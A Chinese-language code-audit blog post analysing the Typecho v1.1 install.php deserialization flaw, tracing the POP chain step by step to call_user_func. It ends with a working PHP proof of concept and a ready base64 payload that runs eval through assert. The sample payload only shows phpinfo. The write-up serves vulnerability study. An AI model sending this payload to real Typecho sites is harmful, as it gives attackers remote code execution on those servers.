---
title: "审计 Typecho 反序列化导致任意代码执行"
slug: audit-typecho-deserialize-to-rce
url: /2021/audit-typecho-deserialize-to-rce.html
date: 2021-02-19 12:50:05
categories: ["代码审计"]
tags: ["PHP", "反序列化漏洞", "Typecho", "代码审计"]
toc: true
draft: false
---

Typecho 是一个 PHP 开发的博客系统，使用得还是挺多的，本文审计的漏洞是基于 v1.1 版本的，于 2017 年曝出的反序列化漏洞。在看完其他很多师傅博客对该漏洞的审计，发现很有学习价值，同时调试理解。

测试程序版本：[Typecho v1.1(15.5.12)](https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta)

## pop 链

提前已经大概了解整个 pop 链，所以贴张[网图](https://www.anquanke.com/post/id/155306)如下：

![pop 链](https://oss.zjun.info/zjun.info/20210219144052.png)

下面按照这个流程进行分析。

## 漏洞分析

`Typecho v1.1` 版本安装完成之后，不会自动删除 `install.php` 文件，而这也是漏洞发生的点。

漏洞入口是 `install.php` ，先进行了两个前置判断。可以看见调试信息，只要传入 GET 参数 finish，并且还需要 Http 头部的 Referer 为站内 URL 即可，主要在 59 行与 74 行体现。

![install.php](https://oss.zjun.info/zjun.info/20210218223316.png)

随后就是产生反序列化漏洞的点，于 229 行到 235 行

![install.php](https://oss.zjun.info/zjun.info/20210218230143.png)

230 行将 `__typecho_config` 的值通过 base64 解码之后反序列化， `__typecho_config` 是 `/var/Typecho/Cookie.php` 中传过来的，可通过 `Cookie` 或 `Post` 方法传入，此处可控。

![/var/Typecho/Cookie.php](https://oss.zjun.info/zjun.info/20210218232305.png)

回到 `install.php` ，看到 232 行，将 `$config['adapter']` 传入 `Typecho_Db()` 中， `$config` 就是在 230 行反序列化传来的对象，因此该参数也是可控的，跟进 `Typecho_Db()`

![/var/Typecho/Db.php](https://oss.zjun.info/zjun.info/20210219133227.png)

在 `/var/Typecho/Db.php` 文件中，分析其构造方法，114 行传入的 `$adapterName` ，在 120 行做字符串拼接， `$adapterName` 其实就是 `install.php` 文件中 232 行传入的 `$config['adapter']` ，是可控参数，如果该参数是对象的话，那么就会调用其 `__toString()` 方法。

> \_\_construct：构造函数会在每次创建新对象时先调用
>
> \_\_toString：当对象被当做字符串的时候会自动调用该函数

寻找可用的 `__toString()` 方法，跟进 `/var/Typecho/Feed.php` 文件，于 223 行开始

![/var/Typecho/Feed.php](https://oss.zjun.info/zjun.info/20210219135052.png)

再往下分析，290 行调用了 `$item['author']->screenName` ，是当前类的一个私有变量。如果 `$item['author']` 是一个不存在 `screenName` 属性的类的话，就会调用 `__get` 魔术方法，而此处的 `item` 同样可控

> \_\_get：当调用一个未定义的属性时访问此方法

![/var/Typecho/Feed.php](https://oss.zjun.info/zjun.info/20210219140758.png)

找到 `/var/Typecho/Request.php` 第 269 行可利用的 `__get` 方法

![/var/Typecho/Request.php](https://oss.zjun.info/zjun.info/20210219141137.png)

分析该 get 函数，检测 `$key` 是否在 `$this->_params[$key]` 这个数组里面，如果有的话将值赋值给 `$value` ，紧着又对其他数组变量检测 `$key` 是否在里面，如果在数组里面没有检测 `$key` ，则将 `$value` 赋值成 `$default` ，最后判断一下 `$value` 类型，将 `$value` 传入到 `_applyFilter()` 函数里面。 `$this->_params[$key]` 是可控的，而 `$key` 正是 `screenName` ，因此 `$value` 可控

![/var/Typecho/Request.php](https://oss.zjun.info/zjun.info/20210219141254.png)

跟进 `_applyFiter()` 函数

![/var/Typecho/Request.php](https://oss.zjun.info/zjun.info/20210219142313.png)

163 行发现危险函数 `array_map()` 和 `call_user_func()` ，且 `$filter` 和 `$value` 都可控。程序首先遍历类中 `$_filter` 变量，如果 `$value` 是数组则将调用 `array_map()` ，反之则将调用 `call_user_func()` 。

直接这样构造的 Poc 传入会返回 500，原因是在 `install.php` 的开头还有一个点，第 54 行调用了 `ob_start()`

![install.php](https://oss.zjun.info/zjun.info/20210219144606.png)

> ob_start：打开输出控制缓存

程序对反序列化之后的内容进行处理时抛出异常位于 `/var/Typecho/Db.php` 第 123 行

![/var/Typecho/Db.php](https://oss.zjun.info/zjun.info/20210219151005.png)

并在 `/var/Typecho/Common.php` 中第 237 行调用了 `ob_end_clean()` 清空了缓冲区

![/var/Typecho/Common.php](https://oss.zjun.info/zjun.info/20210219145854.png)

并在最后在 354 行输出到模板中，然后 `exit` 退出了程序。具体传参执行过程可通过调试看出。解决方法可以提前 `exit` 程序，让程序不运行到抛出异常处。

## poc

```php
<?php

class Typecho_Feed{
    private $_type;
    private $_items = array();

    public function __construct(){
        $this->_type = "RSS 2.0";
        $this->_items = array(
            array(
                "title" => "test",
                "link" => "test",
                "data" => "20190430",
                "author" => new Typecho_Request(),
            ),
        );
    }
}

class Typecho_Request{
    private $_params = array();
    private $_filter = array();

    public function __construct(){
        $this->_params = array(
            "screenName" => "eval('phpinfo();exit;')",
        );
        $this->_filter = array("assert");
    }
}

$a = new Typecho_Feed();

$c = array(
    "adapter" => $a,
    "prefix" => "test",
);

echo base64_encode(serialize($c));
```

执行得到

```
YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjIzOiJldmFsKCdwaHBpbmZvKCk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ==
```

![phpinfo()](https://oss.zjun.info/zjun.info/20210219150702.png)

## 参考

* <https://www.anquanke.com/post/id/155306>
* <https://www.cnblogs.com/litlife/p/10798061.html>
* <https://paper.seebug.org/424/>
* <https://github.com/typecho/typecho/commit/e277141c974cd740702c5ce73f7e9f382c18d84e>
